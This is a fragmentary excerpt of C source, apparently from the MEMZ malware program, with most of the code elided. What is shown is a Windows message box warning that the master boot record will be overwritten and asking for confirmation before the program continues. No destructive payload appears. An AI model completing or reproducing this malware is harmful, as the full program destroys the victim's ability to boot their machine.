...
void main() {
	...
	if (argc > 1) {
		...
		if (MessageBoxA(NULL, "Just to warn you, you are about to get malware.\r\n\
The master boot record WILL be overwritten.\r\n\
...
ARE YOU SURE YOU WANT AN UNUSABLE MACHINE?", "MEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
			ExitProcess(0);
		}
